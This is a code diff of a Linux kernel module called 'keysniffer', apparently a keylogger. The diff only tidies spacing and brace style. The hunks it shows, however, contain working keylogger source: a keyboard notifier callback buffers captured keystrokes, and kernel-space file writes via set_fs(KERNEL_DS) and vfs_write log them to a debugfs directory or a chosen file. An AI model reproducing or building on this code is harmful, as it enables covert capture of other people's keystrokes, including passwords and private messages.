@@ -180,14 +180,14 @@ int keysniffer_cb(struct notifier_block *nblock,
 	strncpy(keys_buf + buf_pos, keybuf, len);
 	buf_pos += len;
 	keys_buf[buf_pos++] = '\n';
-	if ( output == NULL ){
+	if (output == NULL) {
 		pr_debug("%s\n", keybuf);
-	}else{
+	} else{
 		mm_segment_t oldfs;
 		oldfs = get_fs();
 		set_fs(KERNEL_DS);
 		loff_t off = 0;
-		
+
 		vfs_write(output, keybuf, len, &off);
 		vfs_write(output, "\n", 1, &off);
 
@@ -204,7 +204,7 @@ static int __init keysniffer_init(void)
 	if (codes < 0 || codes > 2)
 		return -EINVAL;
 
-	if ( output_path == NULL ){
+	if (output_path == NULL) {
 		subdir = debugfs_create_dir("kisni", NULL);
 		if (IS_ERR(subdir))
 			return PTR_ERR(subdir);
@@ -216,8 +216,8 @@ static int __init keysniffer_init(void)
 			debugfs_remove_recursive(subdir);
 			return -ENOENT;
 		}
-	}else{
-		output = filp_open( output_path, O_WRONLY|O_CREAT|O_APPEND, 0400 );
+	} else{
+		output = filp_open(output_path, O_WRONLY|O_CREAT|O_APPEND, 0400);
 		if (IS_ERR(output))
 			return -ENOENT;
 	}
